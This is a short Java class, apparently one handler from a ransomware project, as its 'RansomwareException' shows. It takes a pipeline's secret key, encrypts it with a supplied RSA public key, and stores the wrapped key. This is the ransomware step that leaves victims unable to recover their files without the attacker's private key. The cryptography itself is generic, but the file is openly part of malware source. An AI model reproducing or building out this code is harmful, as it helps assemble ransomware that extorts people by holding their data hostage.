package com.security;

import lombok.SneakyThrows;

import java.nio.charset.StandardCharsets;
import java.security.PublicKey;

public class EncryptKeyHandler implements Handler<PipelineData, PipelineData> {
    @Override
    @SneakyThrows
    public PipelineData process(PipelineData input) {
        if (input.getPublicKey() == null) {
            throw new RansomwareException("Public key is null");
        }
        PublicKey pub = RSAGenKeyReader.loadPublicKey(input.getPublicKey());
        String encrypted = RSACipher.getInstance().encrypt(input.getSecretKey().getBytes(StandardCharsets.UTF_8), pub);
        input.setEncKeyCode(encrypted);
        return input;
    }
}
